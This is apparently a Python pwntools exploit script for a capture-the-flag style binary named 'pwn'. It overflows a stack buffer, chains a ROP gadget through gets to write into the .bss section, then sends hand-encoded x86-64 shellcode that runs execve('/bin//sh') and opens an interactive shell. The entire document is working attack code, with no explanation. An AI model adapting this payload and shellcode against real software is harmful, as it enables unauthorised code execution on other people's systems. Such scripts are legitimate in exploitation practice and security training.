from pwn import * 

context.log_level='debug'
sh=process('./pwn')
elf=ELF('./pwn')
#gdb.attach(sh)
offset=0x70+8
#shellcode=asm(shellcraft.sh())
print hex(elf.bss())
payload='a'*offset+p64(0x4006a3)+p64(elf.bss())+p64(elf.plt['gets'])+p64(0x601040)
sh.sendline(payload)
pause()
shellcode=''
#shellcode='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'
shellcode+='\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73'
shellcode+='\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89'
shellcode+='\xe6\xb0\x3b\x0f\x05'
sh.sendline(shellcode)
sh.interactive()
